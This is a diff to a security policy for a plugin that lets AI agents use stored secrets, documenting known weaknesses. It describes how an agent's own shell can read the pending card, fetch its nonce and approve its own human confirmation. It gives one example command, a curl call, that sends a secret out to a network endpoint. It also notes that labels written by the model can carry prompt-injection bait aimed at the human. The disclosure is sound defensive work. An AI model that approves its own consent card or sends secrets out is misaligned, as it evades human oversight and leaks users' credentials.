@@ -4,7 +4,8 @@
 
 | version | supported |
 | --- | --- |
-| 0.1.x | yes |
+| 0.2.x | yes |
+| 0.1.x | security fixes only |
 
 ## Reporting a vulnerability
 
@@ -33,6 +34,11 @@ The value travels only in the `POST /api/secret-input/card/{id}/answer` body.
 Outbound scrubbing is **best-effort, not a sandbox** (see the README threat model).
 Reports that require defeating same-uid process isolation, memory forensics, or
 encoded/split output are documented residual risks, not vulnerabilities.
+
+Consent for spending a ref: with `require_consume_approval` (default `true`),
+`secret_exec` and `secret_export` open a confirmation card showing the exact
+command/cwd or env key and wait for a human decision. This is a **visibility and
+consent gate, not a security boundary** — see "Known, deliberate exposures".
 
 Two carve-outs from the outbound promise are stated plainly because they are easy
 to miss: values **shorter than 8 characters are never registered for scrubbing**
@@ -63,6 +69,21 @@ child's `argv` (below).
 - A same-host agent can answer the card before the human does and make the plugin
   store a fabricated value. The plugin records and displays the answering peer and
   timestamp so the human can notice; it cannot prevent this at the HTTP layer.
+- **The host does not gate plugin tools, and the confirmation card can approve
+  itself.** On QwenPaw 2.2.2 (measured 2026-10-21) `secret_exec` ran with no host
+  approval prompt — `/api/approval/list` stayed empty throughout. The plugin's
+  confirmation card is therefore the only gate before a ref is spent, and the
+  same loopback caller (including the agent's own shell) can read `/pending`,
+  fetch the nonce from `/card/{id}/meta`, and `POST /answer {"approve": true}`.
+  The card makes model-authored actions visible and lets a human deny them; it
+  does not stop an agent that deliberately evades the human. Set
+  `require_consume_approval=false` only when commands are reviewed elsewhere.
+- **`secret_exec` is an exfiltration primitive.** The command is written by the
+  model, so the value can be sent to any network endpoint (`curl -d "$SECRET"
+  https://…`) or written to a file. The scrub middleware covers what the model
+  *sees* — including reading that file back with another tool — but a network send
+  leaves the machine before any scrubbing runs. It cleans what the model sees, not
+  what it sends out. Review the exact command before letting an agent spend a ref.
 - The card's `label`/`reason` are written by the model and can carry
   prompt-injection bait aimed at the human. They are rendered as untrusted text.
 
